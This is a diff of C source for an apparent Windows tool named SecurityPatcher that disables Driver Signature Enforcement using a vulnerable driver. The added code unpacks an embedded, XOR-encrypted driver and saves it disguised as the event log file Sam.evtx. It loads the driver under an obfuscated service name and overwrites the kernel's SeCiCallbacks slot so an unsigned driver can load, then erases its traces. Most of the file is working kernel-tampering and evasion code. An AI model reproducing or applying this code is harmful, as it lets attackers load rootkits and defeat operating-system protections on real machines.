@@ -1,19 +1,18 @@
 // ============================================================================
-// SecurityPatcher — DSE bypass via vulnerability driver (kvc.sys/RTCore64)
+// SecurityPatcher — DSE bypass via embedded vulnerability driver (BB variant)
 //
 // ExecuteAutoPatchLoad implements the 5-step bypass:
-//   1. Locate kvc.sys in DriverStore (or System32\drivers fallback)
+//   1. Extract kvc.sys from PE resource (XOR decrypt + LZNT1 decompress),
+//      write to kvc_Log (\SystemRoot\System32\winevt\Logs\Sam.evtx)
 //   2. Load kvc.sys under an obfuscated service name
 //   3. Open device, resolve ntoskrnl base, read current SeCiCallbacks slot
 //   4. Overwrite slot with SafeFunction (no-op); load the target unsigned driver
-//   5. Restore original slot value; unload kvc.sys; clean up registry key
+//   5. Restore original slot value; unload kvc.sys; Cleanupkvc (file + key)
 //
 // DSE state is persisted across reboots via [DSE_STATE] in drivers.ini so
-// that an interrupted run (e.g. power loss between steps 4 and 5) can recover
-// the original callback on the next boot instead of leaving DSE permanently off.
+// that an interrupted run can recover the original callback on the next boot.
 //
-// Physical memory I/O uses the RTCore64-compatible RTC_PACKET layout that
-// kvc.sys expects for its read/write IOCTL pair.
+// Physical memory I/O uses the RTCore64-compatible RTC_PACKET layout.
 // ============================================================================
 
 #include "SecurityPatcher.h"
@@ -195,18 +194,18 @@ HANDLE OpenDriverDevice(PCWSTR deviceName) {
 }
 
 // ============================================================================
-// AUTOPATCH LOAD — 5-step DSE bypass and target driver load
+// AUTOPATCH LOAD — 5-step DSE bypass and target driver load (BB variant)
 //
 // Steps:
-//   1. Locate kvc.sys (DriverStore → System32\drivers fallback)
-//   2. Load kvc.sys under the obfuscated service name from MmGetPoolDiagnosticString
+//   1. ExtractkvcFromResource — XOR+LZNT1 decompress embedded payload to Sam.evtx
+//   2. LoadDriver under obfuscated service name
 //   3. Resolve ntoskrnl base; compute patchable callback address
 //   4. Save original callback to drivers.ini [DSE_STATE]; write SafeFunction
-//   5. Load target driver; restore original callback; unload kvc.sys
+//   5. Load target driver; restore original callback; unload kvc.sys; Cleanupkvc
 //
-// If the callback slot already contains SafeFunction (previous run crashed
-// after patch but before restore), the save/patch step is skipped and the
-// stored originalCallback is used for restoration instead.
+// If the callback slot already contains SafeFunction (previous crash), the
+// save/patch step is skipped and the stored originalCallback is used for restore.
+// On any error after step 2, kvc.sys is unloaded and Cleanupkvc is called.
 // ============================================================================
 
 // entry          — INI_ENTRY for the driver to load under DSE bypass
@@ -218,76 +217,69 @@ NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGL
     HANDLE hDriver;
     ULONGLONG ntBase, callbackToPatch, safeFunction, currentCallback;
     PWSTR driverName = MmGetPoolDiagnosticString();
-    WCHAR resolvedDevicePath[MAX_PATH_LEN];
-    PWSTR devicePath;
-    BOOLEAN isKvc;
-    PWSTR p;
-    PWSTR telemetryName;
-    SIZE_T nameStart;
 
     DisplayMessage(L"INFO: Starting AutoPatch sequence for driver: ");
     DisplayMessage(entry->ServiceName);
     DisplayMessage(L"\r\n");
 
-    DEBUG_LOG(L"STEP 1: Locating kvc.sys...\r\n");
+    DEBUG_LOG(L"STEP 1: Loading non-compliant driver...\r\n");
 
-    static WCHAR kvcSysPath[MAX_PATH_LEN];
-    if (!FindKvcSysPath(kvcSysPath, MAX_PATH_LEN)) {
-        DisplayMessage(L"FAILED: kvc.sys not found in DriverStore or System32\\drivers\r\n");
+    if (!ExtractkvcFromResource()) {
+        DisplayMessage(L"FAILED: Cannot extract non-compliant driver from resource\r\n");
         return STATUS_NO_SUCH_DEVICE;
     }
 
-    status = LoadDriver(driverName, kvcSysPath, L"KERNEL", L"SYSTEM");
+    status = LoadDriver(driverName, kvc_Log, L"KERNEL", L"SYSTEM");
     if (!NT_SUCCESS(status) && status != STATUS_IMAGE_ALREADY_LOADED) {
         DisplayMessage(L"FAILED: Cannot load non-compliant driver\r\n");
         DisplayStatus(status);
+        Cleanupkvc();
         return status;
     }
     DEBUG_LOG(L"SUCCESS: Non-compliant driver loaded\r\n");
 
-    // If DriverDevice ends with "kvc" (exact driver name match), resolve to telemetry name
-    devicePath = config->DriverDevice;
-    isKvc = FALSE;
-
-    // Find last backslash, compare what follows with "kvc"
-    nameStart = 0;
-    p = config->DriverDevice;
-    while (*p) {
-        if (*p == L'\\') nameStart = (SIZE_T)(p - config->DriverDevice) + 1;
-        p++;
-    }
-
-    // Check if remainder after last backslash is exactly "kvc"
-    if (config->DriverDevice[nameStart] == L'k' &&
-        config->DriverDevice[nameStart + 1] == L'v' &&
-        config->DriverDevice[nameStart + 2] == L'c' &&
-        config->DriverDevice[nameStart + 3] == L'\0') {
-        isKvc = TRUE;
-    }
-
-    if (isKvc) {
-        telemetryName = MmGetPoolDiagnosticString();
-        wcscpy_safe(resolvedDevicePath, MAX_PATH_LEN, L"\\Device\\");
-        wcscat_safe(resolvedDevicePath, MAX_PATH_LEN, telemetryName);
-        devicePath = resolvedDevicePath;
-        DEBUG_LOG(L"DEBUG: Resolved 'kvc' to telemetry device name\r\n");
+    // If DriverDevice ends with "kvc", resolve to the dynamic telemetry device name
+    WCHAR resolvedDevicePath[MAX_PATH_LEN];
+    PWSTR devicePath = config->DriverDevice;
+    {
+        SIZE_T nameStart = 0;
+        PWSTR p = config->DriverDevice;
+        while (*p) {
+            if (*p == L'\\') nameStart = (SIZE_T)(p - config->DriverDevice) + 1;
+            p++;
+        }
+        if (config->DriverDevice[nameStart] == L'k' &&
+            config->DriverDevice[nameStart + 1] == L'v' &&
+            config->DriverDevice[nameStart + 2] == L'c' &&
+            config->DriverDevice[nameStart + 3] == L'\0') {
+            wcscpy_safe(resolvedDevicePath, MAX_PATH_LEN, L"\\Device\\");
+            wcscat_safe(resolvedDevicePath, MAX_PATH_LEN, driverName);
+            devicePath = resolvedDevicePath;
+            DEBUG_LOG(L"DEBUG: Resolved 'kvc' to telemetry device name\r\n");
+        }
     }
 
     hDriver = OpenDriverDevice(devicePath);
     if (!hDriver) {
         DisplayMessage(L"FAILED: Cannot open driver device\r\n");
+        UnloadDriver(driverName);
+        Cleanupkvc();
         return STATUS_NO_SUCH_DEVICE;
     }
 
     ntBase = GetNtoskrnlBase();
     if (ntBase == 0) {
         NtClose(hDriver);
+        UnloadDriver(driverName);
+        Cleanupkvc();
         DisplayMessage(L"FAILED: Cannot find ntoskrnl\r\n");
         return STATUS_OBJECT_NAME_NOT_FOUND;
     }
 
     if (config->Offset_SeCiCallbacks == 0 || config->Offset_SafeFunction == 0) {
         NtClose(hDriver);
+        UnloadDriver(driverName);
+        Cleanupkvc();
         DisplayMessage(L"FAILED: Kernel offsets not found (INI or Scan)\r\n");
         return STATUS_OBJECT_NAME_NOT_FOUND;
     }
@@ -297,6 +289,8 @@ NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGL
 
     if (!ReadMemory64(hDriver, callbackToPatch, &currentCallback, config->IoControlCode_Read)) {
         NtClose(hDriver);
+        UnloadDriver(driverName);
+        Cleanupkvc();
         DisplayMessage(L"FAILED: Cannot read current callback\r\n");
         return STATUS_NO_SUCH_DEVICE;
     }
@@ -347,28 +341,20 @@ NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGL
         DisplayStatus(status);
     }
 
-    // CleanupOmniDriver is now in SetupManager
-    CleanupOmniDriver();
+    // Cleanupkvc is now in SetupManager
+    Cleanupkvc();
     DisplayMessage(L"SUCCESS: AutoPatch sequence completed\r\n");
     return STATUS_SUCCESS;
 }
 
 // ============================================================================
-// DSE STATE PERSISTENCE
+// RAW ENCODING-AGNOSTIC SECTION DETECTOR
 //
-// The original SeCiCallbacks slot value is written to drivers.ini [DSE_STATE]
-// before the slot is overwritten.  If the system loses power or crashes
-// between patch and restore, the next boot's BootManager reads this value
-// and restores DSE before executing any INI actions, avoiding a permanently
-// disabled DSE state.
-//
-// File format: UTF-16 LE with BOM; appended to the end of drivers.ini.
-// RemoveStateSection strips [DSE_STATE] by rewriting the file without it.
-// ============================================================================
-
 // Scans the raw bytes of STATE_FILE_PATH for the [DSE_STATE] header in either
 // UTF-16 LE (native format) or UTF-8 / ANSI (editor-saved variants).
 // Used as a fallback when ReadIniFile cannot parse the file encoding.
+// ============================================================================
+
 static BOOLEAN FileContainsDseStateRaw(void) {
     UNICODE_STRING usPath;
     OBJECT_ATTRIBUTES oa;
@@ -417,6 +403,7 @@ static BOOLEAN FileContainsDseStateRaw(void) {
         ULONG bytesRead = (ULONG)iosb.Information;
         offset.QuadPart += bytesRead;
 
+        // Merge carry + current chunk into a single window on the stack.
         UCHAR window[21 + 4096];
         memset_impl(window, 0, sizeof(window));
         memcpy_impl(window, carry, carryLen);
@@ -434,6 +421,7 @@ static BOOLEAN FileContainsDseStateRaw(void) {
             if (j == kLenA) found = TRUE;
         }
 
+        // Save tail for the next iteration
         if (windowLen >= kTail) {
             carryLen = kTail;
             memcpy_impl(carry, window + windowLen - kTail, kTail);
@@ -447,15 +435,29 @@ static BOOLEAN FileContainsDseStateRaw(void) {
     return found;
 }
 
+// ============================================================================
+// DSE STATE PERSISTENCE
+//
+// The original SeCiCallbacks slot value is written to drivers.ini [DSE_STATE]
+// before the slot is overwritten.  If the system loses power or crashes
+// between patch and restore, the next boot's BootManager reads this value
+// and restores DSE before executing any INI actions, avoiding a permanently
+// disabled DSE state.
+//
+// File format: UTF-16 LE with BOM; appended to the end of drivers.ini.
+// RemoveStateSection strips [DSE_STATE] by rewriting the file without it.
+// ============================================================================
+
 // Atomically replaces any existing [DSE_STATE] section and appends a new one
 // containing the given callback value as a 0x-prefixed hex string.
 // Called immediately before the DSE patch write; must not fail silently.
 //
 // Idempotency guard: if the exact same callback value is already present in
 // [DSE_STATE], the function returns immediately without touching the file.
-// This prevents duplicate sections when [DSE_STATE] exists in any encoding
-// (UTF-16 LE BOM is the authoritative format; a file saved as UTF-8 by an
-// external editor causes ReadIniFile to fall through to a clean re-write).
+// This prevents duplicate sections accumulating across reboots or retries,
+// regardless of the file encoding (UTF-16 LE BOM is the authoritative format;
+// a file saved as UTF-8 by an external editor will cause ReadIniFile to fail
+// gracefully and fall through to a clean re-write below).
 BOOLEAN SaveStateSection(ULONGLONG callback) {
     // --- Idempotency guard (encoding-agnostic) ---
     ULONGLONG existing = 0;
@@ -469,7 +471,36 @@ BOOLEAN SaveStateSection(ULONGLONG callback) {
     }
     // --- End idempotency guard ---
 
-    RemoveStateSection();  // ensure at most one [DSE_STATE] section exists, normalize encoding
+    RemoveStateSection();  // ensure at most one [DSE_STATE] section exists
+
+    // -----------------------------------------------------------------------
+    // Detect file encoding by reading the first 2 bytes (BOM check).
+    // UTF-16 LE BOM = 0xFF 0xFE  → write wide chars (native format)
+    // Anything else (UTF-8, ANSI) → write narrow UTF-8 bytes
+    // This prevents mixed-encoding files when the INI was saved by an editor
+    // as UTF-8.
+    // -----------------------------------------------------------------------
+    BOOLEAN isUtf16 = FALSE;
+    {
+        UNICODE_STRING usBom;
+        OBJECT_ATTRIBUTES oaBom;
+        IO_STATUS_BLOCK iosbBom;
+        HANDLE hBom = NULL;
+        UCHAR bomBytes[2] = { 0, 0 };
+        LARGE_INTEGER bomOffset;
+        bomOffset.QuadPart = 0;
+
+        RtlInitUnicodeString(&usBom, STATE_FILE_PATH);
+        InitializeObjectAttributes(&oaBom, &usBom, OBJ_CASE_INSENSITIVE, NULL, NULL);
+        if (NT_SUCCESS(NtOpenFile(&hBom, FILE_READ_DATA | SYNCHRONIZE, &oaBom, &iosbBom,
+                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                  FILE_SYNCHRONOUS_IO_NONALERT))) {
+            NtReadFile(hBom, NULL, NULL, NULL, &iosbBom,
+                       bomBytes, 2, &bomOffset, NULL);
+            NtClose(hBom);
+        }
+        isUtf16 = (bomBytes[0] == 0xFF && bomBytes[1] == 0xFE);
+    }
 
     UNICODE_STRING usFilePath;
     OBJECT_ATTRIBUTES oa;
@@ -478,60 +509,77 @@ BOOLEAN SaveStateSection(ULONGLONG callback) {
     NTSTATUS status;
     LARGE_INTEGER byteOffset;
 
-    WCHAR content[512];
-    SIZE_T len = wcscpy_safe(content, 512, L"\r\n[DSE_STATE]\r\n");
-    len = wcscat_safe(content, 512, L"OriginalCallback=");
-
-    WCHAR hexValue[32];
-    ULONGLONGToHexString(callback, hexValue, TRUE);
-    len = wcscat_safe(content, 512, hexValue);
-    len = wcscat_safe(content, 512, L"\r\n");
-    
-    if (len >= 512) {
-        DisplayMessage(L"FAILED: State content too long\r\n");
-        return FALSE;
-    }
-
     RtlInitUnicodeString(&usFilePath, STATE_FILE_PATH);
     InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     status = NtOpenFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
-                       FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
+                        FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
 
     if (!NT_SUCCESS(status)) {
+        // File does not exist yet — create it with UTF-16 LE BOM
         status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
-                             NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE,
-                             FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+                              NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE,
+                              FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
         if (!NT_SUCCESS(status))
             return FALSE;
 
-        // File is new — write UTF-16 LE BOM at offset 0 so ReadIniFile detects
-        // the encoding correctly on the next boot.
         WCHAR bom = 0xFEFF;
         byteOffset.QuadPart = 0;
-        status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, &bom,
-                            sizeof(WCHAR), &byteOffset, NULL);
-        if (!NT_SUCCESS(status)) {
-            NtClose(hFile);
-            return FALSE;
-        }
+        NtWriteFile(hFile, NULL, NULL, NULL, &iosb, &bom, sizeof(WCHAR), &byteOffset, NULL);
+        isUtf16 = TRUE;
     }
 
+    // Query current file size to append at EOF
     FILE_STANDARD_INFORMATION fileInfo;
     memset_impl(&fileInfo, 0, sizeof(fileInfo));
     status = NtQueryInformationFile(hFile, &iosb, &fileInfo,
-                                   sizeof(FILE_STANDARD_INFORMATION),
-                                   FileStandardInformation);
-
+                                    sizeof(FILE_STANDARD_INFORMATION),
+                                    FileStandardInformation);
     if (!NT_SUCCESS(status)) {
         NtClose(hFile);
         return FALSE;
     }
-
     byteOffset.QuadPart = fileInfo.EndOfFile.QuadPart;
-    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, content,
-                        (ULONG)(wcslen(content) * sizeof(WCHAR)),
-                        &byteOffset, NULL);
+
+    WCHAR hexValue[32];
+    ULONGLONGToHexString(callback, hexValue, TRUE);
+
+    if (isUtf16) {
+        // --- UTF-16 LE write (native) ---
+        WCHAR content[512];
+        SIZE_T len = wcscpy_safe(content, 512, L"\r\n[DSE_STATE]\r\nOriginalCallback=");
+        len = wcscat_safe(content, 512, hexValue);
+        len = wcscat_safe(content, 512, L"\r\n");
+        if (len >= 512) { NtClose(hFile); return FALSE; }
+
+        status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, content,
+                             (ULONG)(wcslen(content) * sizeof(WCHAR)),
+                             &byteOffset, NULL);
+    } else {
+        // --- UTF-8 / ANSI write ---
+        // Build narrow string manually (all chars are ASCII-safe)
+        char content[512];
+        char hexNarrow[32];
+        ULONG hi = 0;
+
+        // Convert WCHAR hex string to narrow chars
+        while (hexValue[hi] && hi < 31) {
+            hexNarrow[hi] = (char)hexValue[hi];
+            hi++;
+        }
+        hexNarrow[hi] = '\0';
+
+        // Concatenate: "\r\n[DSE_STATE]\r\nOriginalCallback=<hex>\r\n"
+        const char* prefix = "\r\n[DSE_STATE]\r\nOriginalCallback=";
+        ULONG pi = 0, ci = 0;
+        while (prefix[pi] && ci < 511) content[ci++] = prefix[pi++];
+        pi = 0;
+        while (hexNarrow[pi] && ci < 511) content[ci++] = hexNarrow[pi++];
+        content[ci++] = '\r'; content[ci++] = '\n'; content[ci] = '\0';
+
+        status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, content,
+                             ci, &byteOffset, NULL);
+    }
 
     NtClose(hFile);
 
@@ -623,7 +671,6 @@ BOOLEAN RemoveStateSection(void) {
 
     PWSTR line = iniContent;
 
-    BOOLEAN wasUtf16 = (line[0] == 0xFEFF);
     if (line[0] == 0xFEFF)
         line++;
 
@@ -711,16 +758,9 @@ BOOLEAN RemoveStateSection(void) {
     }
 
     if (!foundDseSection) {
-        if (wasUtf16) {
-            // Already UTF-16 LE, no [DSE_STATE] — nothing to do
-            FreeAllocatedBuffer(newContent);
-            FreeIniFileBuffer(iniContent);
-            return TRUE;
-        }
-        // File is not UTF-16 LE (e.g. saved as UTF-8 by an editor) — normalize
-        // encoding by rewriting as UTF-16 LE so SaveStateSection can append safely.
-        DEBUG_LOG(L"INFO: Normalizing drivers.ini encoding to UTF-16 LE\r\n");
-        // fall through to the write block below
+        FreeAllocatedBuffer(newContent);
+        FreeIniFileBuffer(iniContent);
+        return TRUE;
     }
 
     UNICODE_STRING usFilePath;
